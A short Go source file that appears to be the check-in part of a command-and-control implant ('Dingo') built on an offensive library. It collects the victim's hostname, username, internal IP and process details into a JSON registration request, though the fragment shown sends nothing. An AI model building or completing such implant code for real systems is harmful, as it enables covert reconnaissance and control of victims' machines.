package main

import (
	"encoding/json"

	hg "github.com/deranged0tter/hellsgopher"
)

type InitReq struct {
	AgentID         int    `json:"agentid"`
	Hostname        string `json:"hostname"`
	Username        string `json:"username"`
	Domain          string `json:"domain"`
	InternalIP      string `json:"internalip"`
	ProcessPath     string `json:"processpath"`
	ProcessID       int    `json:"processid"`
	ProcessParentID int    `json:"processpartentid"`
	ProcessArch     string `json:"processarch"`
	ProcessElevated int    `json:"processelevated"`
	OSBuild         string `json:"osbuild"`
	OSVersion       string `json:"osversion"`
	OSArch          string `json:"osarch"`
	Sleep           int    `json:"sleep"`
}

func InitDingo() {
	username, _ := hg.GetUsername()
	processPath, _ := hg.GetCurrentProcessPath()

	initRequest := InitReq{
		AgentID:         int(AgentID),
		Hostname:        hg.GetHostname(),
		Username:        username,
		Domain:          "",
		InternalIP:      hg.GetInternalIP(),
		ProcessPath:     processPath,
		ProcessID:       hg.GetCurrentProcessID(),
		ProcessParentID: hg.GetCurrentParentProcessID(),
		ProcessArch:     hg.GetCurrentProcessArch(),
		ProcessElevated: 0,
		OSBuild:         "",
		OSVersion:       "",
		OSArch:          hg.GetCurrentProcessArch(),
		Sleep:           SLEEP,
	}

	jsonData, _ := json.Marshal(initRequest)
}
